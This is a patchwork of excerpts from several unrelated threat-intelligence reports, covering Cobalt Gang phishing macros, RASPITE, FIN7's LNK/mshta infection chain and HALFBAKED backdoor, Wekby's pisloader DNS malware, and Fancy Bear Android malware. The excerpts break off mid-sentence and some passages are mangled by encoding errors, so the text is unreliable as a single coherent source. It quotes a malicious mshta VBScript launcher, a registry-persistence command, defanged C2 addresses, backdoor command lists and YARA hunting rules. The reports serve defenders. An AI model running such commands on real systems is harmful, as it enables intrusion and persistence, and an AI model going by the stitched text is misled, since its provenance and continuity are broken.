the topic.

One of the most common approaches is the use of spear phishing emails employing social engineering or commonly used exploits (such as CVE-2017-0199 or the ThreadKit builder) to trick the employees of organizations of interest. Once the initial infection has occurred is when the attacker becomes more sophisticated, deploying advanced custom pieces of malware, more advanced tools, and/or using living-off-the land tools (such as the use of PowerShell, or tools like CMSTP or Regsvr32).\\nThis approach makes it more difficult for threat hunters and defenders to find those needles in the haystack necessary to identify a campaign and its objectives.\\xa0 However even if an attacker uses commodity builders and tools, there is always a chance to find specific signals or characteristics that help to identify and track an actor’s infrastructure. One of the groups well known for following these TTPs is the Cobalt Gang, which is still active even after the arrest of their alleged leader in Spain this year.\\nDuring October 2018, Unit 42 has been investigating ongoing Cobalt Gang campaigns, as well as leveraging the latest information publicly reported in research reports, such as the ones described by Talos or Morphisec, to help discover and tie new infrastructure to this attack group.\\nAs a result, we have been able to identify both the use of a common macro builder as well as specific document metadata which have allowed us to track and cluster new activity and infrastructure associated with the Cobalt Gang.\\nA Recent Effective Example of Delivery\\nOne of the latest examples related to the campaign under analysis was used in attacks just a few days ago. It shows the simplicity of the attack delivery employed by this group.\\nThe attack reinforces the fact that email is still one of the primary attack vectors we continuously observe. This attack begins by targeting employees at several banking entities across the globe using an email with subject “Confirmations on October 16, 2018”.\\nThe sample shown in Figure 1 can already be found in popular public online malware repositories.\\n(SHA256:\\xa0 5765ecb239833e5a4b2441e3a2daf3513356d45e1d5c311baeb31f4d503703e).\\nFigure 1. Example of Email delivery\\nThe attachment is just a PDF document without any kind of code or exploit. Instead it seeks to use social engineering to convince the user click a link to download a malicious macro. This is a method used before by the Cobalt Gang and discussed in previous research as for example by Talos.\\nFigure 2. PDF sample with embedded link\\nThe PDF is simple and embeds a link that will open a legitimate Google location, and redirect the browser to a malicious document from there:\\nFigure 3. Malicious doc browser redirect\\nIn order to be effective against static analysis tools, the PDF that attackers crafted the PDF to seem more authentic: it contains empty pages as well as some text pages that help in not raising red flags during analysis, shown in Figures 4 and 5. Keep in mind that PDFs with low number of pages or high entropy in the content can raise suspicious flags in static analysis.\\nFigure 4. PDF static analysis\\nFigure 5. PDF text used to fill pages\\nBy employing these two techniques the PDF avoids almost all traditional AV detection, resulting in a very effective transport of the first stage of the attack via email.\\nIf the attack progresses, the user will be taken to the download of an MS Word document containing malicious macros that has very low detection rate at the moment of this campaign delivery. From a metadata standpoint, the document does not include any specific signal or characteristic that would help us tracking documents from the same author, as shown in Figure 6.\\nFigure 6. Doc102018.doc metadata\\nThe downloaded malicious macro uses cmstp.exe to run a “scriptlet”, a technique well known to bypass AppLocker, and continues with the next stages of the payload delivery.\\xa0 The objective of this research is not the payload analysis, but to focus on all possible aspects of the attack delivery for further tracking on the actors’ campaign and its associated infrastructure.\\nSo, the question is now… how can this simple delivery method help identify the campaign and objectives?\\nMacro Builder Identification\\nThe attack also achieves quite low detection results with its macro code, so one of the first focuses of the investigation is the identification of a possible underlying builder. By looking into the macro code for “Doc102018.doc”, we can posit multiple theories.\\nThe macro code is over 1500 lines in length, and starts declaring a set of variables with a very specific nomenclature (in this sample, letXX(num)):\\nFigure 7. Example of format of macro variables\\nSome of the variables are used in long encoding / decoding routines based on individual character assignations:\\nFigure 8. Using specific variable format in decoding routines\\nProcedures and functions are also defined using the same nomenclature (in this sample, letXX()):\\nFigure 9. Procedures and Functions in VBA code\\nAnd it makes use of the API call “CallByName” to invoke methods at runtime:\\nFigure 10. Use of CallByName in VBA code\\nIf we analyze some previous samples linked to Cobalt Gang, such as the ones depicted by Morphisec, this pattern is also observable (in this case, using PkXX instead of letXX):\\nFigure 11. VBA pattern in other documents\\nOne initial approach to hunt for the pattern can be based on the following regular expressions for the different areas:\\nVariable definitions /[A-Za-z]k[0-9]{2}([0-9]{1})/\\nFunction definitions /Private Function [A-Za-z]{2,5}[0-9]{2,3}\\\\(/\\nProcedure definitions /Sub [A-Za-z]{2,5}[0-9]{2,5}\\\\(/\\nIn order to test our hypothesis for the builder we created the following Yara rules:\\nrule cmstp_macro_builder_rev_a\\n{\\nmeta:\\ndescription=\"CMSTP macro builder based on variable names and runtime invoke\"\\nauthor=\"Palo Alto Networks Unit42\"\\nstrings:\\n$method=\"CallByName\"\\n$varexp=/[A-Za-z]k[0-9]{2}([0-9]{1})/\\ncondition:\\n$method and\\n#method == 2 and\\n#varexp > 10\\n}\\nrule cmstp_macro_builder_rev_b {\\nmeta:\\ndescription=\"CMSTP macro builder based on routines and functions names and runtime invoke\"\\nauthor=\"Palo Alto Networks Unit42\"\\nstrings:\\n$func=/Private Function [A-Za-z]{1,5}[0-9]{2,3}\\\\(/\\n$sub=/Sub [A-Za-z]{1,5}[0-9]{2,5}\\\\(/\\n$call=\"CallByName\"\\ncondition:\\n$call and\\n#func > 1 and\\n#sub > 1\\n}\\n12345678910111213141516171819202122232425262728\\nrule cmstp_macro_builder_rev_a{\\xa0\\xa0\\xa0\\xa0meta:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0description=\"CMSTP macro builder based on variable names and runtime invoke\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0author=\"Palo Alto Networks Unit42\"\\xa0\\xa0\\xa0\\xa0strings:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$method=\"CallByName\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$varexp=/[A-Za-z]k[0-9]{2}([0-9]{1})/\\xa0\\xa0\\xa0\\xa0condition:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$method and\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0#method == 2 and\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0#varexp > 10 } rule cmstp_macro_builder_rev_b {\\xa0\\xa0\\xa0\\xa0meta:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0description=\"CMSTP macro builder based on routines and functions names and runtime invoke\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0author=\"Palo Alto Networks Unit42\"\\xa0\\xa0\\xa0\\xa0strings:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$func=/Private Function [A-Za-z]{1,5}[0-9]{2,3}\\\\(/\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$sub=/Sub [A-Za-z]{1,5}[0-9]{2,5}\\\\(/\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$call=\"CallByName\"\\xa0\\xa0\\xa0\\xa0condition:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0$call and\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0#func > 1 and\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0#sub > 1}\\nHunting with these Yara rules leads to very positive results identifying this builder as well as a set of malicious documents using it. But the documents identified are not always targeting the finance or banking industries, and so, we cannot guarantee that this builder is only used by this specific Cobalt Gang group and its campaigns against those industries.\\nHowever, using this in combination with other aspects such as the target, payload, or dropper characteristics, becomes very useful in tracking this group’s campaigns, as we will see in the following sections.\\nLet’s focus then on the first stage of the delivery, the PDF documents.\\nCommon Signals in PDF Documents\\nAs we have seen, the use of a commodity PDF file with an embedded Google redirect link results in a very effective social engineering artifact. As there is no exploit or code executed, our research will now be focused on the metadata information from the document for further analysis.\\nFigure 12. PDF Exiftool metadata\\nOur next hypothesis would be to check if the PDF documents could have been created based on a template document, where the author modifies the embedded link in the PDF and saves different document versions over time.\\nBased on the XMP specification, we will pay attention to the values of the “DocumentID” and “InstanceID” Media Management Properties:\\nFigure 13. XMP Media Management Properties\\nIn order to confirm this hypothesis, let’s focus on the Document ID metadata field. Basically, saving the same template twice with 2 different links would produce the same Document ID but multiple Instance ID values (one per saved document).\\nSearching our telemetry data for this metadata content produces interesting results.\\nIn order to help hunting for the content, the following Yara rule also could be used:\\nrule cobaltgang_pdf_metadata_rev_a{\\nmeta:\\ndescription=\"Find documents saved from the same potential Cobalt Gang PDF template\"\\nauthor=\"Palo Alto Networks Unit 42\"\\nstrings:\\n$ = \"<xmpMM:DocumentID>uuid:31ac3688-619c-4fd4-8e3f-e59d0354a338\" ascii wide\\ncondition:\\nany of them\\n}\\n123456789\\nrule cobaltgang_pdf_metadata_rev_a{\\xa0\\xa0\\xa0\\xa0meta:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0description=\"Find documents saved from the same potential Cobalt Gang PDF template\"\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0author=\"Palo Alto Networks Unit 42\"\\xa0\\xa0\\xa0\\xa0strings:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 $ = \"<xmpMM:DocumentID>uuid:31ac3688-619c-4fd4-8e3f-e59d0354a338\" ascii wide\\xa0\\xa0\\xa0\\xa0condition:\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 any of them}\\nThe results confirm our hypothesis (see Appendix for IOCs), and we have been able to find multiple PDF files that the attacker has saved with different contents but starting on the same “template”, all of them sharing the same characteristics.\\n(different content)\\nFigure 14. Example PDF document\\nFurther analysis on the subsequent stages of the attack will allow us to confirm if the samples are related to Cobalt Gang campaigns.\\nFor example, let’s analyze the following document:\\nObserved File Name\\nSHA256\\nREMITTER REFERENCE PMT.pdf\\n1d0aae6cff1f7a772fac67b74a39904b8b9da46484b4ae8b621a6566f7761d16\\nThe document was delivered by email, with the subject “Fund Transfer 08-October-2018″, targeting banking customers:\\nFigure 15. Email data associated to REMITTER REFERENCE PMT.pdf\\nAnd it contains the embedded link redirecting to the following URL:\\nhxxps://fundswp[.]com/Document082018.doc\\nWhich downloads the document:\\nObserved File Name\\nSHA256\\nDocument082018.doc\\n020ba5a273c0992d62faa05144aed7f174af64c836bf82009ada46f1ce3b6eee\\nBy extracting the macro code, we can validate how it matches the macro builder described in the previous section.

Summary of relations and overlaps.\\nAs it can be observed in the different clusters of activity:\\nThe initial cluster of PDF documents, on the left, links to specific domains for the download of Microsoft Office files using the macro builder structure.\\nSome of the domains in use are publicly registered with the name of “grigoredanbanescu” and allow us to find other related domains, which are already linked to previous Cobalt Gang activity.\\nSome of the initial PDFs have relations with Microsoft Office files linked to “grigoredanbanescu” activity, confirming again the relationships.\\nConclusion\\nCommodity attacks are widely used for both criminal and more targeted attacks, making identification difficult for networks defenders and threat hunters. One actor that makes extensive use of this approach to compromise victims is the Cobalt Gang.\\nBy focusing on specific aspects of the macro builders and metadata the actors left behind we were able to develop new mechanisms to track and hunt Cobalt Gang activity and infrastructure.\\nPalo Alto Networks customers are protected in the following ways:\\nWildFire detects malware samples used by this

We call this activity group RASPITE.\\nAnalysis of RASPITE tactics, techniques, and procedures (TTPs) indicate the group has been active in some form since early- to mid-2017. RASPITE targeting includes entities in the US, Middle East, Europe, and East Asia. Operations against electric utility organizations appear limited to the US at this time.\\nRASPITE leverages strategic website compromise to gain initial access to target networks. RASPITE uses the same methodology as DYMALLOY and ALLANITE in embedding a link to a resource to prompt an SMB connection, from which it harvests Windows credentials. The group then deploys install scripts for a malicious service to beacon back to RASPITE-controlled infrastructure, allowing the adversary to remotely access the victim machine.\\nRASPITE overlaps significantly with Symantec’s LEAFMINER, which recently released a report on the group’s activity in the Middle East.\\nRASPITE’s activity to date currently focuses on initial access operations within the electric utility sector. Although focused on ICS-operating entities, RASPITE has not demonstrated an ICS-specific capability to date. This means that the activity group is targeting electric utilities, but there is no current indication the group has the capability of destructive ICS attacks including widespread blackouts like those in Ukraine.\\nWhile the group has not yet demonstrated an ICS capability, RASPITE’s recent targeting focus and methodology are clear indicators of necessary activity for initial intrusion operations into an IT network to prepare the way for later potential ICS events.\\nDragos threat intelligence leverages the Dragos Platform, our threat operations center, and other sources to provide comprehensive insight into threats affecting industrial control security and safety worldwide. Dragos does not corroborate nor conduct political attribution to threat activity. Dragos instead focuses on threat behaviors and appropriate detection and response. Read more about Dragos’ approach to categorizing threat activity and attribution.\\nDragos does not publicly describe ICS activity group technical details except in extraordinary circumstances in order to limit tradecraft proliferation.

FIN7 is referred to by many vendors as “Carbanak Group”, although we do not equate all usage of the CARBANAK backdoor with FIN7. FireEye recently observed a FIN7 spear phishing campaign targeting personnel involved with United States Securities and Exchange Commission (SEC) filings at various organizations.\\nIn a newly-identified campaign, FIN7 modified their phishing techniques to implement unique infection and persistence mechanisms. FIN7 has moved away from weaponized Microsoft Office macros in order to evade detection. This round of FIN7 phishing lures implements hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim.\\nIn this ongoing campaign, FIN7 is targeting organizations with spear phishing emails containing either a malicious DOCX or RTF file – two versions of the same LNK file and VBScript technique. These lures originate from external email addresses that the attacker rarely re-used, and they were sent to various locations of large restaurant chains, hospitality, and financial service organizations. The subjects and attachments were themed as complaints, catering orders, or resumes. As with previous campaigns, and as highlighted in our annual M-Trends 2017 report, FIN7 is calling stores at targeted organizations to ensure they received the email and attempting to walk them through the infection process.\\nInfection Chain\\nWhile FIN7 has embedded VBE as OLE objects for over a year, they continue to update their script launching mechanisms. In the current lures, both the malicious DOCX and RTF attempt to convince the user to double-click on the image in the document, as seen in Figure 1. This spawns the hidden embedded malicious LNK file in the document. Overall, this is a more effective phishing tactic since the malicious content is embedded in the document content rather than packaged in the OLE object.\\nBy requiring this unique interaction – double-clicking on the image and clicking the “Open” button in the security warning popup – the phishing lure attempts to evade dynamic detection as many sandboxes are not configured to simulate that specific user action.\\nFigure 1: Malicious FIN7 lure asking victim to double click to unlock contents\\nThe malicious LNK launches “mshta.exe” with the following arguments passed to it:\\nvbscript:Execute(\"On Error Resume Next:set w=GetObject(,\"\"Word.Application\"\"):execute w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close\")\\nThe script in the argument combines all the textbox contents in the document and executes them, as seen in Figure 2.\\nFigure 2: Textbox inside DOC\\nThe combined script from Word textbox drops the following components:\\n\\\\Users\\\\[user_name]\\\\Intel\\\\58d2a83f7778d5.36783181.vbs\\n\\\\Users\\\\[user_name]\\\\Intel\\\\58d2a83f777942.26535794.ps1\\n\\\\Users\\\\[user_name]\\\\Intel\\\\58d2a83f777908.23270411.vbs\\nAlso, the script creates a named schedule task for persistence to launch “58d2a83f7778d5.36783181.vbs” every 25 minutes.\\nVBScript #1\\nThe dropped script “58d2a83f7778d5.36783181.vbs” acts as a launcher. This VBScript checks if the “58d2a83f777942.26535794.ps1” PowerShell script is running using WMI queries and, if not, launches it.\\nPowerShell Script\\n“58d2a83f777942.26535794.ps1” is a multilayer obfuscated PowerShell script, which launches shellcode for a Cobalt Strike stager.\\nThe shellcode retrieves an additional payload by connecting to the following C2 server using DNS:\\naaa.stage.14919005.www1.proslr3[.]com\\nOnce a successful reply is received from the command and control (C2) server, the PowerShell script executes the embedded Cobalt Strike shellcode. If unable to contact the C2 server initially, the shellcode is configured to reattempt communication with the C2 server address in the following pattern:\\n[a-z][a-z][a-z].stage.14919005.www1.proslr3[.]com\\nVBScript #2\\n“mshta.exe” further executes the second VBScript “58d2a83f777908.23270411.vbs”, which creates a folder by GUID name inside “Intel” and drops the VBScript payloads and configuration files:\\n\\\\Intel\\\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\\\58d2a83f777638.60220156.ini\\n\\\\Intel\\\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\\\58d2a83f777688.78384945.ps1\\n\\\\Intel\\\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\\\58d2a83f7776b5.64953395.txt\\n\\\\Intel\\\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\\\58d2a83f7776e0.72726761.vbs\\n\\\\Intel\\\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\\\58d2a83f777716.48248237.vbs\\n\\\\Intel\\\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\\\58d2a83f777788.86541308.vbs\\n\\\\Intel\\\\{BFF4219E-C7D1-2880-AE58-9C9CD9701C90}\\\\Foxconn.lnk\\nThis script then executes “58d2a83f777716.48248237.vbs”, which is a variant of FIN7’s HALFBAKED backdoor.\\nHALFBAKED Backdoor Variant\\nThe HALFBAKED malware family consists of multiple components designed to establish and maintain a foothold in victim networks, with the ultimate goal of gaining access to sensitive financial information. This version of HALFBAKED connects to the following C2 server:\\nhxxp://198[.]100.119.6:80/cd\\nhxxp://198[.]100.119.6:443/cd\\nhxxp://198[.]100.119.6:8080/cd\\nThis version of HALFBAKED listens for the following commands from the C2 server:\\ninfo: Sends victim machine information (OS, Processor, BIOS and running processes) using WMI queries\\nprocessList: Send list of process running\\nscreenshot: Takes screen shot of victim machine (using 58d2a83f777688.78384945.ps1)\\nrunvbs: Executes a VB script\\nrunexe: Executes EXE file\\nrunps1: Executes PowerShell script\\ndelete: Delete the specified file\\nupdate: Update the specified file\\nAll communication between the backdoor and attacker C2 are encoded using the following technique, represented in pseudo code:\\nFunction send_data(data)\\nrandom_string = custom_function_to_generate_random_string()\\nencoded_data = URLEncode(SimpleEncrypt(data))\\npost_data(\"POST”, random_string & \"=\" & encoded_data, Hard_coded_c2_url,\\nCreate_Random_Url(class_id))\\nThe FireEye iSIGHT Intelligence MySIGHT Portal contains additional information based on our investigations of a variety of topics discussed in this post, including FIN7 and the HALFBAKED backdoor. Click\\xa0here\\xa0for more information.\\nPersistence Mechanism\\nFigure 3 shows that for persistence, the document creates two scheduled tasks and creates one auto-start registry entry pointing to the LNK file.\\nFigure 3: FIN7 phishing lure persistence mechanisms\\nExamining Attacker Shortcut Files\\nIn many cases, attacker-created LNK files can reveal valuable information about the attacker’s development environment. These files can be parsed with lnk-parser to extract all contents. LNK files have been valuable during Mandiant incident response investigations as they include volume serial number, NetBIOS name, and MAC address.\\nFor example, one of these FIN7 LNK files contained the following properties:\\nVersion: 0\\nNetBIOS name: andy-pc\\nDroid volume identifier: e2c10c40-6f7d-4442-bcec-470c96730bca\\nDroid file identifier: a6eea972-0e2f-11e7-8b2d-0800273d5268\\nBirth droid volume identifier: e2c10c40-6f7d-4442-bcec-470c96730bca\\nBirth droid file identifier: a6eea972-0e2f-11e7-8b2d-0800273d5268\\nMAC address: 08:00:27:3d:52:68\\nUUID timestamp: 03/21/2017 (12:12:28.500) [UTC]\\nUUID sequence number: 2861\\nFrom this LNK file, we can see not only what the shortcut launched within the string data, but that the attacker likely generated this file on a VirtualBox system with hostname “andy-pc” on March 21, 2017.\\nExample Phishing Lures\\nFilename: Doc33.docx\\nMD5: 6a5a42ed234910121dbb7d1994ab5a5e\\nFilename: Mail.rtf\\nMD5: 1a9e113b2f3caa7a141a94c8bc187ea7\\nFIN7 April 2017 Community Protection Event\\nOn April 12, in response to FIN7 actively targeting multiple clients, FireEye kicked off a Community Protection Event (CPE) – a coordinated effort by FireEye as a Service (FaaS), Mandiant, FireEye iSight Intelligence, and our product team – to secure all clients affected by this campaign.\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today\\'s advanced threats from FireEye.\\nShare\\nRecent Posts\\n28 Apr 2020Excelerating Analysis, Part 2 — X[LOOKUP] Gon’ Pivot To Ya\\n27 Apr 2020Putting the Model to Work: Enabling Defenders With Vulnerability\\nIntelligence — Intelligence for Vulnerability Management, Part Four\\n22 Apr 2020Vietnamese Threat Actors APT32 Targeting Wuhan Government and Chinese\\nMinistry of Emergency Management in Latest Example of COVID-19 Related Espionage\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages',\n",

Wekby is a group that has been active for a number of years, targeting various industries such as healthcare, telecommunications, aerospace, defense, and high tech. The group is known to leverage recently released exploits very shortly after those exploits are available, such as in the case of HackingTeam’s Flash zero-day exploit.\\nThe malware used by the Wekby group has ties to the HTTPBrowser malware family, and uses DNS requests as a command and control mechanism. Additionally, it uses various obfuscation techniques to thwart researchers during analysis. Based on metadata seen in the discussed samples, Palo Alto Networks has named this malware family ‘pisloader’.\\nInfrastructure\\nThe pisloader malware family was delivered via HTTP from the following URL. At the time of writing, this URL was still active.\\nhttp://globalprint-us[.]com/proxy_plugin.exe\\nOther samples hosted on this domain include the following:\\nhttp://globalprint-us[.]com/proxy_web_plugin.exe\\nMD5: E4968C8060EA017B5E5756C16B80B012\\nSHA256: 8FFBB7A80EFA9EE79E996ABDE7A95CF8DC6F9A41F9026672A8DBD95539FEA82A\\nSize: 126976 Bytes\\nCompile Time: 2016-04-28 00:38:46 UTC\\nThis discovered file was found to be an instance of the common Poison Ivy malware family with the following configuration data:\\nCommand and Control Address: intranetwabcam[.]com\\nCommand and Control Port: 80\\nPassword: admin\\nMutex: )!VoqA.I5\\nThe domains witnessed in this attack were all registered very shortly prior to being used. The following domains have been witnessed in this attack:\\nAdditionally, the following IP resolutions have been observed.\\nInitial Dropper\\nThe following sample was discovered initially and is referenced in the subsequent analysis:\\nMD5: E8D58AA76DD97536AC225949A2767E05\\nSHA256: DA3261C332E72E4C1641CA0DE439AF280E064B224D950817A11922A8078B11F1\\nSize: 126976 Bytes\\nCompile Time: 2016-04-27 14:37:34 UTC\\nThis particular file has the following metadata properties. The references to ‘pisload2’ led to the naming of this malware family.\\nFigure 1 pisloader dropper metadata\\nThe initial dropper contains very simple code that is responsible for setting persistence via the Run registry key, and dropping and executing an embedded Windows executable. Limited obfuscation was encountered, where the authors split up strings into smaller sub-strings and used ‘strcpy’ and ‘strcat’ calls to re-build them prior to use. They also used this same technique to generate garbage strings that are never used. This is likely to deter detection and analysis of the sample. The following decompiled code demonstrates this. Comments have been added to show the fully-generated strings.\\nFigure 2 pisloader dropper building strings and setting persistence\\nIn the above decompiled code, we see that the pisloader is generating the following string, which eventually is called to set the Run registry key.\\ncmd.exe /c reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v lsm /t reg_sz /d “%appdata%\\\\lsm.exe” /f\\nThis particular command will set the HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\lsm registry key with a value of “%appdata%\\\\lsm.exe”. After this key is set, the malware proceeds to decrypt a two blobs of data with a single-byte XOR key of 0x54. The resulting data is written to the %appdata%\\\\lsm.exe file path.\\nAfter this file is written, the malware executes the newly written lsm.exe file, which contains the pisloader payload.\\nPayload\\nThe following sample was discovered and is referenced in the subsequent analysis:\\nMD5: 07B9B62FB3B1C068837C188FEFBD5DE9\\nSHA256: 456FFFC256422AD667CA023D694494881BAED1496A3067485D56ECC8FEFBFAEB\\nSize: 102400 Bytes\\nCompile Timestamp: 2016-04-27 13:39:02 UTC\\nThe payload is heavily obfuscated using a return-oriented programming (ROP) technique, as well as a number of garbage assembly instructions. In the example below, code highlighted in red essentially serves no purpose other than to deter reverse-engineering of the sample. This code can be treated as garbage and ignored. The entirety of the function is highlighted in green, where two function offsets are pushed to the stack, followed by a return instruction. This return instruction will point code execution first at the null function, which in turn will point code execution to the ‘next_function’. This technique is used throughout the runtime of the payload, making static analysis difficult.\\nFigure 3 Obfuscated code witnessed in pisloader\\nThe malware is actually quite simplistic once the obfuscation and garbage code is ignored. It will begin by generating a random 10-byte alpha-numeric header. The remaining data is base32-encoded, with padding removed. This data will be used to populate a subdomain that will be used in a subsequent DNS request for a TXT record.\\nThe use of DNS as a C2 protocol has historically not been widely adopted by malware authors. Notable exceptions include the following:\\nFrameworkPOS\\nC3PRO-RACCOON\\nFeederBot\\nMorto\\nPlugX Variants\\nThe use of DNS as a C2 allows pisloader to bypass certain security products that may not be inspecting this traffic correctly.\\nFigure 4 DNS query for TXT record by malware\\nThe pisloader sample will send a beacon periodically that is composed of a random 4-byte uppercase string that is used as the payload. An example of this can be found below:\\nFigure 5 pisloader DNS beacon request\\nThe malware expects various aspects of the DNS responses to be set in a specific way, or else pisloader will ignore the DNS reply. The following DNS flags must be set. Should any additional flags be set, the response will be ignored.\\nResponse\\nRecursion Desired\\nRecursion Available\\nThe ‘Questions’ field must be set to a value of 0x1. The ‘Answer Resource Records’ field must be set to a value of 0x1. Additionally, the response query subdomain must match the original DNS request.\\nThe remote command and control (C2) server is statically embedded within the malware. A single host of ‘ns1.logitech-usa[.]com’ is found in this specific sample.\\nThe C2 server will respond with a TXT record that is encoded similar to the initial request. In the response, the first byte is ignored, and the remaining data is base32-encoded. An example of this can be found below.\\nFigure 6 Example TXT response by C2 server\\nThe following commands, and their descriptions are supported by the malware:\\nsifo – Collect victim system information\\ndrive – List drives on victim machine\\nlist – List file information for provided directory\\nupload – Upload a file to the victim machine\\nopen – Spawn a command shell\\nSome examples of these commands being used can be seen below.

Ł The original application enabled artillery forces to more rapidly process targeting data for the Soviet-era D-30 Howitzer employed by Ukrainian artillery forces reducing targeting time from minutes to under 15 seconds. According to Sherstuk™s interviews with the press, over 9000 artillery personnel have been using the application in Ukrainian military. Ł Successful deployment of the FANCY BEAR malware within this application may have facilitated reconnaissance against Ukrainian troops. The ability of this malware to retrieve communications and gross locational data from an infected device makes it an attractive way to identify the general location of Ukrainian artillery forces and engage them. Ł According to an update provided in March 2017 by the International Institute for Strategic Studies (IISS) Research Associate for Defence and Military Analysis, Henry Boyd, \"excluding the Naval Infantry battalion in the Crimea which was effectively captured wholesale, the Ukrainian Armed Forces lost between 15% and 20% of their pre-war DŒ30 inventory in combat operations.Ł This previously unseen variant of X-Agent represents FANCY BEAR™s expansion in mobile malware development from iOS-capable implants to Android devices, and reveals one more component of the broad spectrum approach to cyber operations taken by Russia-based actors in the war in Ukraine. Ł The collection of such tactical artillery force positioning intelligence by FANCY BEAR further supports CrowdStrike™s previous assessments that FANCY BEAR is likely affiliated with the Russian military intelligence (GRU), and works closely with Russian military forces operating in Eastern Ukraine and its border regions in Russia.˜EXCLUDING THE NAVAL INFANTRY BATTALION IN THE CRIMEA WHICH WAS EFFECTIVELY CAPTURED WHOLESALE, THE UKRAINIAN ARMED FORCES LOST BETWEEN 15% AND 20% OF THEIR PRE˜WAR D˚30 INVENTORY IN COMBAT OPERATIONS. ˚˜HENRY BOYD, International Institute for Strategic Studies (IISS) Research Associate for Defence and Military Analysis USE OF FANCY BEAR ANDROID MALWARE IN TRACKING OF UKRAINIAN FIELD ARTILLERY UNITS BACKGROUND In late June and August 2016, CrowdStrike Intelligence provided initial reporting and technical analysis of a variant of the FANCY BEAR implant X-Agent that targeted the Android mobile platform 2. CrowdStrike identified this X-Agent variant within a legitimate Android application named ˜˚˛˝-˙30.apk. This app was developed and used by artillery troops to simplify targeting data for the D-30 towed howitzer. CrowdStrike investigation reveals that this app has been utilized in a possible training or operational role in at least one unit of the Ukrainian military. Therefore, the implant likely targeted military artillery units operating against pro- Russian separatists in Eastern Ukraine.This implant represents further advancements in FANCY BEAR™s development of mobile malware for targeted intrusions and extends Russian cyber capabilities to the front lines of the battlefield. This Tipper builds on CrowdStrike™s previous reporting by providing a timeline of events, contextual discussion regarding the potential drivers for development and deployment of the malware, and a description of the analytical process resulting in targeting assessments. Finally, this Tipper leverages these assessments, in conjunction with more recently observed activity by Russia-based adversaries, to determine the potential for any future activity in the mobile malware threat space. ˜CROWDSTRIKE IDENTIFIED THIS X˜AGENT VARIANT WITHIN A LEGITIMATE ANDROID APPLICATION NAMED THIS APP WAS DEVEL ˜OPED AND USED BY ARTILLERY TROOPS TO SIMPLIFY TARGETING DATA FOR THE D˜30 TOWED HOWITZER ˚ Russia offers Ukraine loans and discounts on gas Referendum on Crimea/Crimean annexation Gazprom increases gas prices, Ukraine skips payment Intrusions into Ukraine™s Transportation Sector Presidential Elections in Ukraine DDoS and targeted intrusions in media, financial, & political entities in Ukraine Malicious App Observed in Distribution on Forums Protests reach their peak, gov™t cracks down violently; agreement reached for elections; Yanukovich flees to Russia Armed men appear in unmarked uniforms in Crimea DDoS vs. NATO Pro-Russian forces begin seizing government resources in Eastern Ukraine Intrusion against Ukraine™s Central Election Commission Malaysia Air Flight MH17 destroyed by pro-Russian Separatists Minsk I Ceasefire Signed Video depicting use of ˜˚˛˝-˙ 30 application in eastern Ukraine Earliest public reporting on the Android App developed by the Ukrainian soldier CyberBerkut Emerges JAN FEB MAR APR MAY JUNEJULY AUG SEPT OCT NOV DEC JAN FEB MAR APR MAY JUNEJULY AUG SEPT OCT NOV DEC ˜˚˜˛˝˙ 30 DEVELOPED 20 FEB - 13 APR Ukraine™s Parliament convenes and plans to lay foundation for EU Association Agreement UKR Pres.

